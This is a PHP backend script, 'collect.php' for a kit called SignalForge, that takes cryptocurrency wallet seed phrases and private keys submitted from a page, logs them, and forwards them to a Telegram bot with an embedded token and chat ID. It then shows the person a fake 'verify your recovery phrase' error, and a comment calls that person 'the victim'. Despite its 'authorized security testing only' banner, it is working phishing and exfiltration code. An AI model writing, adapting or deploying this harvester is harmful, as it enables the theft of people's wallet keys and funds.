<?php
/**
 * collect.php — SignalForge Capture Backend
 * ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️
 */

$TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
$TELEGRAM_CHAT_ID   = getenv('TELEGRAM_CHAT_ID')   ?: '6964954278';
$ENCRYPTION_KEY     = 'SignalForge_Render_2026_Secret!!';  // 32 chars exactly
$ENCRYPTION_IV      = '1234567890abcdef';                  // 16 chars exactly

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['error' => 'Method not allowed']));
}

$seed       = $_POST['seed'] ?? '';
$pkey       = $_POST['pkey'] ?? '';
$userAgent  = $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$pageUrl    = $_POST['pageUrl'] ?? 'unknown';
$screenSize = $_POST['screenSize'] ?? 'unknown';
$ip         = $_SERVER['REMOTE_ADDR'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown');
$timestamp  = date('Y-m-d H:i:s');

// Ensure logs directory
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Build record
$record = [
    'id'            => uniqid('sf_', true),
    'ip'            => $ip,
    'userAgent'     => $userAgent,
    'pageUrl'       => $pageUrl,
    'screenSize'    => $screenSize,
    'seed'          => $seed ?: null,
    'pkey'          => $pkey ?: null,
    'seedWordCount' => $seed ? str_word_count($seed) : 0,
    'capturedAt'    => $timestamp
];

// Save encrypted to file
$plaintext  = json_encode($record);
$encrypted  = openssl_encrypt($plaintext, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
file_put_contents($logDir . '/captures.log', base64_encode($encrypted) . "\n", FILE_APPEND);

// Save human-readable summary
$summary = "$timestamp | {$record['id']} | IP: $ip | Seed: {$record['seedWordCount']} words | Key: " . ($pkey ? 'YES' : 'NO') . "\n";
file_put_contents($logDir . '/summary.log', $summary, FILE_APPEND);

// --- SEND TELEGRAM ALERT DIRECTLY ---
$message = "🚨 **SignalForge — New Capture** 🚨\n\n";
$message .= "📅 Time: $timestamp\n";
$message .= "🌐 IP: `$ip`\n";
$message .= "📝 Seed: " . ($seed ? '✅ ' . $record['seedWordCount'] . ' words' : '❌ None') . "\n";
$message .= "🔑 Private Key: " . ($pkey ? '✅ Captured' : '❌ None') . "\n";

if ($seed) {
    $truncated = mb_strlen($seed) > 100 ? mb_substr($seed, 0, 100) . '...' : $seed;
    $message .= "\n```\n$truncated\n```\n";
}
if ($pkey) {
    $truncated = mb_strlen($pkey) > 60 ? mb_substr($pkey, 0, 60) . '...' : $pkey;
    $message .= "\n```\n$truncated\n```\n";
}

$message .= "\n📱 " . mb_substr($userAgent, 0, 60);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => json_encode([
        'chat_id'    => $TELEGRAM_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'Markdown'
    ]),
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_CONNECTTIMEOUT => 5,
]);
curl_exec($ch);
curl_close($ch);

// Always return failure to the victim
echo json_encode([
    'success' => false,
    'error'   => 'Connection failed. Please verify your recovery phrase and try again.'
]);
